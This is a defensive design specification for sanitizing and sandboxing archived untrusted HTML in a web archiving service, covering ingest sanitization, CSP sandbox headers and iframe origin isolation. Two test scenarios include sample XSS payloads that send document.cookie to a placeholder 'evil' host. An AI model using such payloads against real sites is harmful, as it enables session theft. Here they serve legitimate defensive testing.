# Archived HTML Serving Specification

## Purpose

Defense-in-depth serving of archived (untrusted) HTML: ingest-time sanitization, sandboxed serving headers on every route that delivers archived content, and origin-isolated viewer iframes in both the public share viewer and the logged-in viewer.

## Requirements

### Requirement: Sanitization at ingest
The archive service SHALL sanitize archived HTML at ingest: `<script>` elements SHALL be removed, `on*` event-handler attributes SHALL be stripped from all elements, and URI-bearing attributes (`href`, `src`, `action`, `formaction`, `xlink:href`) SHALL have `javascript:` and `data:text/html` values neutralized (rewritten to an inert value or the attribute dropped). Sanitization SHALL run before the HTML is persisted to R2, so no stored page contains executable script payload.

#### Scenario: Inline event handler is removed
- **WHEN** archived HTML contains `<img src="a.png" onerror="fetch('//evil?t='+document.cookie)">`
- **THEN** the stored HTML contains no `onerror` attribute
- **AND** the `src` is preserved

#### Scenario: javascript: URI is neutralized
- **WHEN** archived HTML contains `<a href="javascript:document.location='//evil/'+document.cookie">x</a>`
- **THEN** the stored HTML does not execute the payload when the link is clicked in the viewer
- **AND** the anchor text is preserved

#### Scenario: Legitimate content survives sanitization
- **WHEN** archived HTML contains standard markup, inline styles, images, and forms
- **THEN** sanitization removes nothing except scripts, event handlers, and dangerous URIs
- **AND** the page renders as captured in the sandboxed viewer

### Requirement: Sandboxed serving headers for archived content
Every route that serves archived HTML or assets on the `pagepocket.app` origin — the gateway file routes (`/api/v1/share/public/{token}/f/*`, `/api/v1/archive/pages/{page_id}/f/*`) and the frontend proxy routes that forward them (`/api/sc/*`, `/api/pp/archive/*/f/*`) — SHALL itself emit the full sandbox header set: a sandboxing `Content-Security-Policy` (`sandbox allow-popups allow-forms`, explicitly without `allow-same-origin`), `X-Content-Type-Options: nosniff`, and the stored content type. The frontend proxies SHALL NOT rely on the gateway's headers alone — the browser sees only the proxy's response, so each proxy emits the same header set on its own response. HTML responses SHALL additionally set `Referrer-Policy: no-referrer`.

#### Scenario: Archived HTML served without origin privileges
- **WHEN** a viewer fetches a page's `index.html` through any serving route
- **THEN** the response carries `Content-Security-Policy: sandbox allow-popups allow-forms`
- **AND** scripts, if any were stored, cannot access pagepocket.app cookies, storage, or DOM

#### Scenario: Frontend proxy preserves sandbox headers
- **WHEN** the frontend route proxies a gateway file response
- **THEN** the proxy emits the sandbox CSP and `nosniff` headers on its own response, equivalent to the gateway's
- **AND** the proxy does not serve archived content without them

#### Scenario: Assets are served with their stored content type
- **WHEN** an archived image or stylesheet is fetched through a serving route
- **THEN** the response content type matches the stored asset content type
- **AND** `X-Content-Type-Options: nosniff` prevents MIME confusion

### Requirement: Viewer iframes are origin-isolated in BOTH viewers
Origin isolation SHALL cover every viewer that renders archived HTML: the public share viewer (`PublicViewerShell`, serving `/api/sc/{token}/index.html`) AND the logged-in viewer (`PageViewerShell`, serving `/api/pp/archive/{page_id}/f/index.html`). Each viewer's iframe sandbox attribute SHALL omit `allow-same-origin`, MAY retain `allow-popups` and `allow-forms` only where the product requires them, and SHALL NOT grant scripting to the archived document. Logged-in viewing carries the same untrusted-content risk as public sharing: the product archives arbitrary web pages, so a user can ingest attacker-controlled HTML into their own archive and then view it — same-origin privileges on the application origin would turn any script gap into account takeover.

#### Scenario: Archived page cannot reach the application origin
- **WHEN** a user views an archived page in either the public share viewer or the logged-in viewer shell
- **THEN** the iframe sandbox excludes `allow-same-origin`
- **AND** code in the archived page (if it somehow executes) obtains no access to the pagepocket.app origin

#### Scenario: Logged-in viewer matches the public viewer's isolation
- **WHEN** the logged-in viewer (`PageViewerShell`) renders a page the user archived — including one ingested from attacker-controlled HTML
- **THEN** its sandbox attribute is identical to the public viewer's (`allow-popups allow-forms`, no `allow-same-origin`)
- **AND** the nested sandbox intersection with the serving route's CSP sandbox yields a unique opaque origin for the archived document

#### Scenario: Viewer still functions without same-origin
- **WHEN** an archived page renders in the sandboxed iframe
- **THEN** navigation between archived pages, form controls, and assets resolve within the sandbox as designed
